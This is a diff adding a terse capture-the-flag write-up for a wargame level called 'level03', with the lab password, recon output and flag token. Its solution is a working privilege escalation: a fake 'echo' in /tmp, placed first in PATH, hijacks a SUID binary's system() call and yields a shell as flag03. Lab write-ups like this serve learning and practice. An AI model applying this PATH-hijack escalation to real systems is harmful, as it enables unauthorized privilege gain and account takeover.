@@ -1,0 +1,29 @@
+login/pw:
+	level03 : kooda2puivaav1idi4f57q8iq
+
+user info:
+	id
+		=> uid=2003(level03) gid=2003(level03) groups=2003(level03),100(users)
+	pwd
+		=> /home/user/level03
+	ls -la
+		=> -rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03
+			=> SUID flag03
+				=> Reverse Engineering
+
+RESOLUTION:
+	scp -P 4242 level03@192.168.1.23:~/level03 .
+	bash script.sh
+		=> New project
+		=> Analyze /level03
+			=> system("/usr/bin/env echo Exploit me")
+				=> path exloit
+	Find repo with wx perm:
+		=> /tmp
+			=> export PATH=/tmp:$PATH
+			=> echo "/bin/bash" > /tmp/echo
+			=> chmod 755 /tmp/echo
+			=> ./level03
+				=> We are flag03
+	getflag:
+		=> Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
